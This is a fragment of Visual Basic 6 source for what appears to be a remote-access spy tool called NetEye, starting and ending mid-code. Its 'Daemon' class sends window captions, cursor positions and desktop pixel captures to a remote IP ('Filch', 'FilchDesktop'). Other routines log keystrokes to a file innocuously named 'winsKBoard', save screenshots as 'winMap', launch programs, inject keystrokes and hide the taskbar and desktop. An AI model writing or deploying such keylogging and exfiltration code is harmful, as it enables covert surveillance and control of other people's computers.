 retValue = GetWindowText(parentWnd, tmpStr, 255)
    strSpyData(4) = tmpStr ' base class window's caption
    strSpyData(5) = x & Space(5) & Y ''' X and Y Mouse Pointer coordinates

DoEvents
Run = strSpyData
Exit Function
EH:
    strSpyData(0) = Err.Number
    strSpyData(1) = Err.Description
    strSpyData(2) = "Daemon.Run()"
    Run = strSpyData
End Function

'======================================================================
'======================================================================
'======================================================================

Public Function Filch(ByVal strIP As String) As String
 On Error GoTo EH:
 
 Dim objSerializer As Object
 Set objSerializer = CreateObject("NetEye.Serializer", strIP)
 Filch = objSerializer.Serialize(Run)
 Exit Function

EH:
 Filch = Err.Number & Space(1) & Err.Description & vbCrLf & "Daemon.Filch(strIP)"
End Function


'======================================================================
'======================================================================
'======================================================================
Public Function InvokeApp(ByVal strAppName As String) As String
Dim ReturnValue As Long
On Error GoTo EH

 ReturnValue = Shell(strAppName, 1)   ' Run Application.
 AppActivate ReturnValue    ' Activate the Application
 InvokeApp = "you application was successfully invoked"
 Exit Function
 
EH:
 InvokeApp = Err.Number & Space(1) & Err.Description & vbCrLf & "Daemon.InvokeApp(strAppName)"
End Function


'======================================================================
'======================================================================
'======================================================================
Public Function InvokeKeys(ByVal strKeyName As String) As String
On Error GoTo EH

 SendKeys strKeyName, True
 InvokeKeys = "Key was successfully Pressed"
 Exit Function
 
EH:
 InvokeKeys = Err.Number & Space(1) & Err.Description & vbCrLf & "Daemon.InvokeKeys(strKeyName)"
End Function


'======================================================================
'======================================================================
'======================================================================
Public Function ScanDesktop(ByRef lngIterations As Long, Coords() As Integer) As SpyColors()
 Dim xx As Integer, yy As Integer
 Dim rDC As Long
 
 Dim spyColor(700000) As SpyColors, lngArC As Long
 Dim lngOldColor As Long, lngCurrentColor As Long
 Dim lngColorCounter As Long
 
On Error GoTo EH
 
  rDC = GetDC(0&)
  lngOldColor = GetPixel(rDC, Coords(0), Coords(1))
 
 For xx = Coords(0) To Coords(2)
  For yy = Coords(1) To Coords(3)
   rDC = GetDC(0&)
   lngCurrentColor = GetPixel(rDC, xx, yy)
   ''if color is same then increment the color counter
    If lngCurrentColor = lngOldColor Then
       lngColorCounter = lngColorCounter + 1
       DoEvents
     Else
     'change the color value
       spyColor(lngArC).Count = lngColorCounter
       spyColor(lngArC).Value = lngOldColor
       lngArC = lngArC + 1
       lngOldColor = lngCurrentColor
       lngColorCounter = 1
       DoEvents
    End If
        DoEvents
   Call ReleaseDC(0&, rDC)
 Next yy, xx
 lngIterations = lngArC
 ScanDesktop = spyColor
 Exit Function
 
EH:
 '''ScanDesktop(0) = Err.Number & Space(1) & Err.Description & vbCrLf & "Daemon.ScanDesktop()"
 
End Function

Public Function FilchDesktop(ByVal strIP As String, Coords() As Integer) As String
 Dim strFileLocation As String
 Dim lngIterations As Long
 On Error GoTo EH:
    
 Dim objSerializer As Object
 Set objSerializer = CreateObject("NetEye.Serializer", strIP)
 FilchDesktop = objSerializer.SerializeImage(ScanDesktop(lngIterations, Coords), lngIterations, Coords, strFileLocation)
 Exit Function

EH:
 If Err.Number = 70 Then
  Set objSerializer = CreateObject("NetEye.Serializer")
  strFileLocation = " Remotely"
  Resume Next
 End If
 FilchDesktop = Err.Number & Space(1) & Err.Description & vbCrLf & "Daemon.FilchDesktop(strIP,Coords()) As String"
End Function


'========================================================================
''======= Invoke any MessageBox towards the remote machine     =========
'=======================================================================
Public Function InvokeMessageBox(ByVal strPrompt As String, ByVal lngButton As Long, ByVal strTitle As String) As Integer
 On Error GoTo EH
 
 InvokeMessageBox = MessageBox(0, strPrompt, strTitle, lngButton)
 Exit Function
 
EH:
 InvokeMessageBox = 420  ''' Application Defined Error
End Function


'======================================================================
'===============      Log Keys "pressed"            ===================
'======================================================================
Public Function SerializeKeys(ByVal lngDuration As Long) As String
 On Error GoTo EH
 Dim varThisTime As Variant, strKeys As String
 Dim objFile As New FileSystemObject
 Dim objText As TextStream
 
 varThisTime = Timer
 
 Do While (Timer - varThisTime) <= lngDuration
  strKeys = strKeys & LogKeys
  DoEvents
 Loop
 
 Set objText = objFile.OpenTextFile(App.Path & "\" & "winsKBoard", ForWriting, True)
 objText.Write strKeys
  
 Set objText = Nothing
 Set objFile = Nothing
 SerializeKeys = "Keys were properly serialized!"
  
  Exit Function
EH:
SerializeKeys = Err.Description & vbCrLf & Err.Number & vbCrLf & "Daemon.SerializeKeys(lngDuration)"
End Function

'================================================================
'''=========   Start Taking a snap Shot              ============
'================================================================
Public Function TakeSnapShot() As String
 On Error GoTo EH
  Call keybd_event(vbKeySnapshot, 0, 0, 0) 'Get the screen and copy it to clipboard
  DoEvents
  SavePicture Clipboard.GetData(vbCFBitmap), App.Path & "\winMap" ' saves the clipboard data to a BMP file
  DoEvents
  
  TakeSnapShot = "Desktop's Snapshot was taken Successfully"
 Exit Function
 
EH:
 TakeSnapShot = Err.Description & vbCrLf & Err.Number & vbCrLf & "Daemon.TakeSnapShot()"
End Function

'================================================================
'''=========   Start Capturing Mouse                 ============
'================================================================
Public Function CaptureMouse(ByVal x As Long, ByVal Y As Long) As String
On Error GoTo EH

  SetCursorPos x, Y
  CaptureMouse = " Remote Mouse is at " & x & "  X  " & Y
  Exit Function
EH:
  CaptureMouse = Err.Number & Space(2) & Err.Description & vbCrLf & "Daemon.CaptureMouse(X,Y)"
End Function

'================================================================
'''=========      Swap Mouse Button                  ============
'================================================================
Public Function SwapMouseButtons(ByVal bSwap As Long) As String
 Dim strDfltButton As String
On Error GoTo EH

  If bSwap = 0 Then
   strDfltButton = "LEFT"
  Else
   strDfltButton = "RIGHT"
  End If

  SwapMouseButton bSwap
  SwapMouseButtons = "Remote Mouse's Default button is " & strDfltButton
  
  Exit Function
EH:
  SwapMouseButtons = Err.Number & Space(2) & Err.Description & vbCrLf & "Daemon.SwapMouseButtons(bSwap)"
End Function

'================================================================
'''=========      Show Hide Win Component            ============
'================================================================
Public Function ShowHide(ByVal strWinComp As String, ByVal lngSH As Long) As String
 On Error GoTo EH
 Select Case strWinComp
  Case "Task Bar":              ShowHide = TaskBar(lngSH)
  Case "Desktop":               ShowHide = Desktop(lngSH)
  Case "Start Button":          ShowHide = StartButton(lngSH)
  Case "SysTray Clock":         ShowHide = TaskBarClock(lngSH)
  Case "TaskBar Icons":         ShowHide = TaskBarIcons(lngSH)
  Case "Windows ToolBar":       ShowHide = WindowsToolBar(lngSH)
  Case "Programs In Taskbar":   ShowHide = ProgramsInTaskBar(lngSH)
 End Select
 Exit Function
EH:
 ShowHide = Err.Description & vbCrLf & "Daemon.ShowHide(strWinComp,lngSH)"
End Function

'=========================================================
'=======               Open Close CD Rom           =======
'=========================================================
Private Sub LoadCDRomdata()
    On Error Resume Next
    OpenCloseCDRom "close all"
    OpenCloseCDRom "open cdaudio alias cd wait shareable"
    OpenCloseCDRom "set cd time format tmsf wait"
End Sub

Public Function OpenCloseCDRom(cmd As String) As String
  On Error GoTo EH
  
    Static rc As Long
    Dim hWnd As Long
    Static errStr As String * 200
    rc = mciSendString(cmd, 0, 0, hWnd)
    
    If rc = 0 Then
     OpenCloseCDRom = (Mid(cmd, 4))
    Else
     mciGetErrorString rc, errStr, Len(errStr)
     OpenCloseCDRom = errStr
    End If
  Exit Function
EH:
  OpenCloseCDRom = Err.Description & vbCrLf & "Daemon.OpenCloseCDRom(cmd)"
End Function

Private Sub Class_Initialize()
 LoadCDRomdata
End Sub


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          Attribute VB_Name = "modShowHide"

Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long

Public Function TaskBar(ByVal lngSH As Long) As String
 Dim Handle As Long
 Handle& = FindWindow("Shell_TrayWnd", vbNullString)
 ShowWindow Handle&, lngSH
 TaskBar = "TaskBar is:- " & CBool(lngSH)
End Function

Public Function Desktop(ByVal lngSH As Long) As String
 ShowWindow FindWindowEx(FindWindowEx(FindWindow("Progman", vbNullString), 0&, "SHELLDLL_DefView", vbNullString), 0&, "SysListView32", vbNullString), lngSH
 Desktop = "Desktop is:- " & CBool(lngSH)
End Function

Public Function StartButton(ByVal lngSH As Long) As String
 Dim Handle As Long, FindClass As Long
 FindClass& = FindWindow("Shell_TrayWnd", "")
 Handle& 